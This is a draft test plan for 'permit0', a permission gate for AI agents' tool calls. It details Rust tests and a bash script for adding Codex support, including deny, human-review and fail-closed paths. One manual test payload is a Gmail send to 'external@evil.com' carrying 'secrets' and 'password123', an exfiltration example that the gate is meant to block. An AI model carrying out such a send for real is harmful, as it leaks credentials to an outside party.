# 04 — Test Plan

**Status:** Draft
**Revised:** 2026-05-10
**Depends on:** 02-implementation

## Strategy

Tests are organized into three tiers:

1. **Unit tests** in `hook.rs` — fast, no I/O, cover serialization and logic
2. **Integration tests** in `tests/cli_tests.rs` — invoke the binary, verify stdout/exit code
3. **Manual test scripts** — pipe Codex-shaped JSON and inspect output

All existing Claude Code tests must continue to pass (regression).

## Unit Tests

All tests below go in the `#[cfg(test)] mod tests` block in
`crates/permit0-cli/src/cmd/hook.rs`.

### 1. ClientKind::Codex Parsing

```rust
#[test]
fn codex_client_kind_parses() {
    assert_eq!("codex".parse::<ClientKind>().unwrap(), ClientKind::Codex);
    assert_eq!("codex-cli".parse::<ClientKind>().unwrap(), ClientKind::Codex);
    assert_eq!("codex_cli".parse::<ClientKind>().unwrap(), ClientKind::Codex);
}
```

### 2. ClientKind::Codex Strips MCP Prefix (Same as ClaudeCode)

```rust
#[test]
fn codex_strips_mcp_double_underscore_prefix() {
    let c = ClientKind::Codex;
    assert_eq!(c.strip_prefix("mcp__permit0-gmail__gmail_send"), "gmail_send");
    assert_eq!(c.strip_prefix("mcp__permit0-outlook__outlook_archive"), "outlook_archive");
    assert_eq!(c.strip_prefix("Bash"), "Bash");
    assert_eq!(c.strip_prefix("apply_patch"), "apply_patch");
}
```

### 3. Codex HookInput Deserialization (Full Payload)

```rust
#[test]
fn codex_hook_input_full_payload() {
    let json = r#"{
        "session_id": "019dba93-8214-7d50-a089-9690b4ce6b9e",
        "transcript_path": "/home/user/.codex/history/019dba93.jsonl",
        "cwd": "/home/user/project",
        "hook_event_name": "PreToolUse",
        "model": "gpt-5.4",
        "turn_id": "turn-7",
        "tool_name": "mcp__permit0-gmail__gmail_send",
        "tool_use_id": "call_abc123",
        "tool_input": { "to": "alice@example.com", "subject": "Hi" }
    }"#;
    let input: HookInput = serde_json::from_str(json).unwrap();
    assert_eq!(input.tool_name, "mcp__permit0-gmail__gmail_send");
    assert_eq!(input.session_id.as_deref(), Some("019dba93-8214-7d50-a089-9690b4ce6b9e"));
    assert_eq!(input.turn_id.as_deref(), Some("turn-7"));
    assert_eq!(input.tool_input["to"], "alice@example.com");
}
```

### 4. HookInput Backward Compatibility (Claude Code Minimal Payload)

```rust
#[test]
fn hook_input_claude_code_compat() {
    let json = r#"{"tool_name": "Bash", "tool_input": {"command": "ls"}}"#;
    let input: HookInput = serde_json::from_str(json).unwrap();
    assert_eq!(input.tool_name, "Bash");
    assert!(input.session_id.is_none());
    assert!(input.turn_id.is_none());
    assert!(input.cwd.is_none());
}
```

### 5. Codex Output: Allow Produces Empty String

```rust
#[test]
fn codex_output_allow_is_none() {
    let output = codex_output(Permission::Allow, "");
    assert!(output.is_none(), "Allow must produce no stdout for Codex");
}
```

### 6. Codex Output: Deny Produces Valid Envelope

```rust
#[test]
fn codex_output_deny_produces_envelope() {
    let output = codex_output(Permission::Deny, "destructive command blocked").unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert_eq!(
        parsed["hookSpecificOutput"]["hookEventName"],
        "PreToolUse"
    );
    assert_eq!(
        parsed["hookSpecificOutput"]["permissionDecision"],
        "deny"
    );
    assert_eq!(
        parsed["hookSpecificOutput"]["permissionDecisionReason"],
        "destructive command blocked"
    );
}
```

### 7. Codex Output: HITL Maps to Deny

```rust
#[test]
fn codex_output_hitl_maps_to_deny() {
    let output = codex_output(Permission::HumanInTheLoop, "requires review").unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert_eq!(
        parsed["hookSpecificOutput"]["permissionDecision"],
        "deny"
    );
}
```

### 8. Codex Output Does Not Contain "allow" (structural check)

```rust
#[test]
fn codex_output_never_contains_allow() {
    // Codex explicitly rejects permissionDecision: "allow".
    // Use structural JSON check, not substring matching.
    for perm in [Permission::Allow, Permission::Deny, Permission::HumanInTheLoop] {
        let hook_out = match perm {
            Permission::Allow => HookOutput::allow(),
            Permission::Deny => HookOutput::deny("test"),
            Permission::HumanInTheLoop => HookOutput::ask("test"),
        };
        if let Some(json) = hook_output_to_codex(&hook_out) {
            let parsed: serde_json::Value = serde_json::from_str(&json).unwrap();
            assert_ne!(
                parsed["hookSpecificOutput"]["permissionDecision"], "allow",
                "Codex must never produce permissionDecision: allow, got: {json}"
            );
        }
    }
}
```

This tests the full `hook_output_to_codex` converter, not just the raw
`codex_output` helper. For complete coverage of shadow and unknown-mode
paths, see the integration tests below which run the full binary.

### 9. Session ID Derivation: Codex Stdin Takes Priority

```rust
#[test]
fn codex_session_id_from_stdin() {
    let id = derive_session_id_for_format(
        OutputFormat::Codex,
        Some("019dba93-8214".into()),
        None,
    );
    assert_eq!(id, "019dba93-8214");
}
```

### 10. Session ID Derivation: Explicit Flag Overrides Stdin

```rust
#[test]
fn codex_session_id_explicit_overrides() {
    let id = derive_session_id_for_format(
        OutputFormat::Codex,
        Some("stdin-id".into()),
        Some("explicit-id".into()),
    );
    assert_eq!(id, "explicit-id");
}
```

### 11. OutputFormat Selection

```rust
#[test]
fn output_format_from_client() {
    assert_eq!(OutputFormat::from_client(ClientKind::Codex), OutputFormat::Codex);
    assert_eq!(OutputFormat::from_client(ClientKind::ClaudeCode), OutputFormat::ClaudeCode);
    assert_eq!(OutputFormat::from_client(ClientKind::Raw), OutputFormat::ClaudeCode);
}
```

### 12. Unknown Mode + Codex: Defer Produces No Output

```rust
#[test]
fn codex_unknown_defer_produces_no_output() {
    // In Codex mode, defer = exit 0 with no stdout (same as allow)
    let output = codex_output(Permission::Allow, "");
    assert!(output.is_none());
}
```

## Regression Tests

The following existing tests must continue to pass without modification:

- `parse_hook_input` — Claude Code minimal payload
- `hook_output_allow_serialization` — Claude allow envelope
- `hook_output_deny_serialization` — Claude deny envelope
- `hook_output_ask_serialization` — Claude ask envelope
- `hook_output_defer_omits_permission_decision` — Claude defer
- `claude_code_strips_mcp_double_underscore_prefix` — MCP stripping
- `apply_unknown_policy_*` — all unknown mode tests
- `remote_response_*` — all remote mode tests
- `remote_error_*` — all error handling tests

Run with: `cargo nextest run -p permit0-cli`

## Integration Tests

Add to `crates/permit0-cli/tests/cli_tests.rs`. All integration tests must
run the binary as a subprocess and assert **exact** stdout content and exit
codes, not just "contains" checks.

### 1. Codex Hook End-to-End: Allow (exact empty stdout)

```rust
#[test]
fn codex_hook_allow_produces_empty_stdout() {
    let output = Command::new(permit0_binary())
        .args(["hook", "--client", "codex", "--unknown", "defer"])
        .write_stdin(CODEX_GMAIL_READ_JSON)
        .output().unwrap();
    assert!(output.status.success());
    assert!(output.stdout.is_empty(),
        "Codex allow MUST produce zero stdout bytes, got: {:?}",
        String::from_utf8_lossy(&output.stdout));
}
```

### 2. Codex Hook End-to-End: Unknown Tool Deny (exact deny envelope)

```rust
#[test]
fn codex_hook_unknown_deny_produces_deny_envelope() {
    let output = Command::new(permit0_binary())
        .args(["hook", "--client", "codex", "--unknown", "deny"])
        .write_stdin(CODEX_UNKNOWN_TOOL_JSON)
        .output().unwrap();
    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(json["hookSpecificOutput"]["permissionDecision"], "deny");
}
```

### 3. Codex Hook End-to-End: Unknown Tool Defer (exact empty stdout)

```rust
#[test]
fn codex_hook_unknown_defer_produces_empty_stdout() {
    let output = Command::new(permit0_binary())
        .args(["hook", "--client", "codex", "--unknown", "defer"])
        .write_stdin(CODEX_UNKNOWN_TOOL_JSON)
        .output().unwrap();
    assert!(output.status.success());
    assert!(output.stdout.is_empty());
}
```

### 4. Codex Fail-Closed: Malformed stdin (process-level)

```rust
#[test]
fn codex_hook_malformed_stdin_fails_closed() {
    let output = Command::new(permit0_binary())
        .args(["hook", "--client", "codex"])
        .write_stdin("not valid json")
        .output().unwrap();
    // Must NOT be a bare non-zero exit (that fails open in Codex).
    // Either: exit 0 with deny envelope, or exit 2 with stderr reason.
    if output.status.success() {
        let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(json["hookSpecificOutput"]["permissionDecision"], "deny");
    } else {
        assert_eq!(output.status.code(), Some(2),
            "Codex fail-closed must use exit 2, not exit 1");
    }
}
```

### 5. Codex Fail-Closed: Remote daemon unreachable

```rust
#[test]
fn codex_hook_remote_daemon_down_fails_closed() {
    let output = Command::new(permit0_binary())
        .args(["hook", "--client", "codex",
               "--remote", "http://127.0.0.1:19999"])
        .write_stdin(CODEX_GMAIL_READ_JSON)
        .output().unwrap();
    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(json["hookSpecificOutput"]["permissionDecision"], "deny");
}
```

### 6. Codex Shadow Mode: Exact empty stdout

```rust
#[test]
fn codex_hook_shadow_produces_empty_stdout() {
    let output = Command::new(permit0_binary())
        .args(["hook", "--client", "codex", "--shadow", "--unknown", "defer"])
        .write_stdin(CODEX_GMAIL_READ_JSON)
        .output().unwrap();
    assert!(output.status.success());
    assert!(output.stdout.is_empty(),
        "Codex shadow allow must be empty stdout");
}
```

## Manual Test Script

Create `scripts/test-codex-hook.sh` for interactive testing:

```bash
#!/usr/bin/env bash
set -euo pipefail

PERMIT0="./target/release/permit0"

echo "=== Test 1: Gmail send (expect deny or HITL) ==="
echo '{
  "tool_name": "mcp__permit0-gmail__gmail_send",
  "tool_input": {"to":"external@evil.com","subject":"secrets","body":"password123"},
  "session_id": "test-session",
  "hook_event_name": "PreToolUse",
  "cwd": "/tmp",
  "model": "gpt-5.4",
  "turn_id": "t1",
  "tool_use_id": "c1"
}' | $PERMIT0 hook --client codex --unknown defer
echo "Exit code: $?"
echo

echo "=== Test 2: Unknown tool with --unknown defer (expect empty output) ==="
echo '{
  "tool_name": "unknown_tool",
  "tool_input": {},
  "session_id": "test-session",
  "hook_event_name": "PreToolUse",
  "cwd": "/tmp",
  "model": "gpt-5.4",
  "turn_id": "t2",
  "tool_use_id": "c2"
}' | $PERMIT0 hook --client codex --unknown defer
echo "Exit code: $?"
echo

echo "=== Test 3: Shadow mode (expect allow, stderr log) ==="
echo '{
  "tool_name": "mcp__permit0-gmail__gmail_send",
  "tool_input": {"to":"alice@example.com","subject":"hi","body":"hello"},
  "session_id": "test-session",
  "hook_event_name": "PreToolUse",
  "cwd": "/tmp",
  "model": "gpt-5.4",
  "turn_id": "t3",
  "tool_use_id": "c3"
}' | $PERMIT0 hook --client codex --shadow --unknown defer
echo "Exit code: $?"
```

### 7. Remote + Codex: Daemon Returns "human" (HITL)

Test that the Codex adapter correctly maps the daemon's `"human"` wire value
to a deny envelope (after the prerequisite fix to recognize `"human"`):

```rust
#[test]
fn codex_remote_human_maps_to_deny() {
    let resp = RemoteCheckResponse {
        permission: "human".into(),  // actual daemon value, not "humanintheloop"
        action_type: Some("email.send".into()),
        channel: Some("gmail".into()),
        score: Some(62),
        tier: Some("High".into()),
        block_reason: None,
    };
    let hook_out = remote_response_to_hook_output(&resp);
    let codex = hook_output_to_codex(&hook_out);
    assert!(codex.is_some(), "HITL must produce deny for Codex");
    let parsed: serde_json::Value = serde_json::from_str(&codex.unwrap()).unwrap();
    assert_eq!(parsed["hookSpecificOutput"]["permissionDecision"], "deny");
    let reason = parsed["hookSpecificOutput"]["permissionDecisionReason"]
        .as_str().unwrap();
    assert!(reason.contains("email.send"), "reason must include action type");
    assert!(!reason.contains("unknown permission value"),
        "must NOT show 'unknown permission' for the canonical daemon value");
}
```

### 8. Remote + Codex Integration Test (stub server)

```rust
#[test]
fn codex_hook_remote_hitl_produces_deny() {
    // Start a stub server returning {"permission": "human", ...}
    let server = start_stub_check_server(json!({
        "permission": "human",
        "action_type": "email.send",
        "channel": "gmail",
        "score": 62,
        "tier": "High"
    }));
    let output = Command::new(permit0_binary())
        .args(["hook", "--client", "codex",
               "--remote", &server.url()])
        .write_stdin(CODEX_GMAIL_SEND_JSON)
        .output().unwrap();
    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(json["hookSpecificOutput"]["permissionDecision"], "deny");
}
```

## Edge Cases to Verify

| Scenario | Expected behavior |
|----------|-------------------|
| Codex sends `tool_name` without MCP prefix (e.g. `Bash`) | Pass through unchanged, normalize via packs |
| Codex sends sanitized MCP name (hyphens replaced with underscores) | Stripping still works since it splits on `__` |
| Empty `session_id` in Codex payload | Fall back to `CODEX_THREAD_ID` then PPID |
| `hook_event_name` is not `PreToolUse` | Ignore; permit0 processes regardless |
| Very large `tool_input` (>1MB) | Must not crash; serde handles gracefully |
| `tool_input` is `null` | Deserializes as `serde_json::Value::Null`, engine handles |
| Hook timeout (>30s) | Codex kills the process; tool executes (fail-open) |
| `--client codex --remote` with daemon down | Deny with "remote unavailable" (stricter than Claude's ask) |
| Minimal Claude-style payload into `--client codex` | Same behavior as full payload; no errors (backward compat) |
| Post-sanitized MCP name (`mcp__permit0_gmail__gmail_send`) | Stripping still works (splits on `__`) |
| Calibration timeout (daemon returns HTTP 408) | Deny envelope with "HTTP 408" in reason |
| Shadow mode stdout is exactly zero bytes | No trailing newline; `output.stdout.is_empty()` |

## CI Integration

The existing CI already runs `cargo nextest run --workspace`. Codex tests
are added to `permit0-cli` and run as part of the full suite. Do not add a
separate filtered step -- filtering by `codex` would miss regressions in
tests like `client_kind_parses_from_string` that gain Codex assertions but
don't have "codex" in the test name.
